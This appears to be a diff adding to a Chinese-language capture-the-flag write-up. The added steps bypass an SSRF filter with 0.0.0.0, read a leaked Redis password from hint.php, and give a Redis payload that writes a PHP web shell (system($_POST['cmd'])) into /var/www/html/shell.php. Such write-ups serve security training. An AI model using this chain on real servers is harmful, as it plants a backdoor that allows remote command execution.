@@ -294,3 +294,28 @@ else{
 ?>
 ```
 按照提示看一下`hint.php`......原来要本地，那应该是打ssrf，我们看看源码先
+127.0.0.1被waf了，0.0.0.0绕过:
+```http
+?url=http://0.0.0.0/hint.php
+```
+得到`hint.php`：
+```php
+<?php
+if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
+  highlight_file(__FILE__);
+}
+if(isset($_POST['file'])){
+  file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);
+}
+
+```
+看到了redis密码，那就是打密码泄露的redis了，加上auth root就好了
+payload：
+```sql
+auth root
+config set dir /var/www/html/
+config set dbfilename shell.php
+set margin "<?php system($_POST['cmd']);?>"
+save
+quit
+```
